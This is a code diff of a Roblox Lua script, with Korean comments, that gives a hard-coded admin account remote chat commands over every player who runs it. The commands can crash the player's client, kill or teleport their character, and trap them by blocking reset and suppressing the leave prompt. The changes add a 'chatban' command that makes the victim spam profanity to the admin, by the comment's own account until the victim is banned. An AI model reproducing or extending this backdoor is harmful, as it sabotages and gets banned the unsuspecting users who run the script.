@@ -3,16 +3,16 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local AdminList = { "Diwno2ff" }
 
-local Loops = {}
-
 local cmds = {}
 
+-- crash
 cmds["crash"] = function()
     while true do
         print("Penis")
     end
 end
 
+-- kick (재설정 금지 + 나가기 금지)
 cmds["kick"] = function(_, _)
     if LocalPlayer.Character then
         local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -34,6 +34,7 @@ cmds["kick"] = function(_, _)
             newHum.Health = math.huge
         end)
 
+        -- 재설정 금지
         task.spawn(function()
             repeat
                 task.wait()
@@ -42,9 +43,24 @@ cmds["kick"] = function(_, _)
                 end)
             until false
         end)
+
+        -- 나가기 금지
+        task.spawn(function()
+            while true do
+                pcall(function()
+                    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(obj)
+                        if obj.Name == "ErrorPrompt" then
+                            obj:Destroy()
+                        end
+                    end)
+                end)
+                task.wait(1)
+            end
+        end)
     end
 end
 
+-- bring (Admin → 나, 한 번만)
 cmds["bring"] = function(Admin)
     if LocalPlayer.Character and Admin.Character then
         local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -55,6 +71,7 @@ cmds["bring"] = function(Admin)
     end
 end
 
+-- kill
 cmds["kill"] = function()
     if LocalPlayer.Character then
         local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
@@ -64,7 +81,48 @@ cmds["kill"] = function()
     end
 end
 
-local function isAdminListed(playerName)
+-- chatban (밴 걸릴 때까지 admin에게 비공 메시지 전송)
+cmds["chatban"] = function(sender)
+    task.spawn(function()
+        while true do
+            task.wait(0.2)
+            local succ, err = pcall(function()
+                for _, adminName in ipairs(AdminList) do
+                    local admin = Players:FindFirstChild(adminName)
+                    if admin then
+                        local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                        if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
+                            chatEvent.SayMessageRequest:FireServer("fuck", "To " .. admin.Name)
+                        end
+                    end
+                end
+            end)
+            if not succ then
+                break -- 밴 등으로 채팅 불가 시 종료
+            end
+        end
+    end)
+end
+
+-- help (admin 제외한 사용자만 가능)
+cmds["help"] = function(sender)
+    if not isAdminListed(sender.Name) then
+        for _, adminName in ipairs(AdminList) do
+            local admin = Players:FindFirstChild(adminName)
+            if admin then
+                pcall(function()
+                    local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                    if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
+                        chatEvent.SayMessageRequest:FireServer("나는 NP를 사용해요.", "To " .. admin.Name)
+                    end
+                end)
+            end
+        end
+    end
+end
+
+-- Admin 확인
+function isAdminListed(playerName)
     for _, name in ipairs(AdminList) do
         if name:lower() == playerName:lower() then
             return true
@@ -73,7 +131,8 @@ local function isAdminListed(playerName)
     return false
 end
 
-local function FindMatch(Name)
+-- 플레이어 찾기
+function FindMatch(Name)
     Name = Name:lower()
     for _, Player in Players:GetPlayers() do
         if Player.Name:lower():sub(1, #Name) == Name then
@@ -83,23 +142,7 @@ local function FindMatch(Name)
     return nil
 end
 
-local function StartLoop(command, sender, data)
-    if Loops[command] then return end
-    Loops[command] = true
-    task.spawn(function()
-        while Loops[command] do
-            pcall(function()
-                cmds[command](sender, data)
-            end)
-            task.wait(1)
-        end
-    end)
-end
-
-local function StopLoop(command)
-    Loops[command] = nil
-end
-
+-- 명령 처리
 TextChatService.OnIncomingMessage = function(message)
     local sender = message.TextSource
     if not sender then return end
@@ -116,20 +159,6 @@ TextChatService.OnIncomingMessage = function(message)
         local TargetName = args[1] or ""
         local Data = table.concat(args, " ", 2)
 
-        local isLoop = false
-        if Command:sub(1,4) == "loop" then
-            isLoop = true
-            Command = Command:sub(5)
-        elseif TargetName:lower() == "-loop" then
-            isLoop = true
-            TargetName = table.remove(args,1) or ""
-            Data = table.concat(args, " ", 2)
-        elseif Command:sub(1,6) == "unloop" then
-            local unloopCmd = Command:sub(7)
-            StopLoop(unloopCmd)
-            return
-        end
-
         Command = Command:lower()
         if cmds[Command] then
             local Target
@@ -140,13 +169,9 @@ TextChatService.OnIncomingMessage = function(message)
             end
 
             if TargetName == "all" or Target == LocalPlayer then
-                if isLoop then
-                    StartLoop(Command, sender, Data)
-                else
-                    pcall(function()
-                        cmds[Command](sender, Data)
-                    end)
-                end
+                pcall(function()
+                    cmds[Command](sender, Data)
+                end)
             end
         end
     end
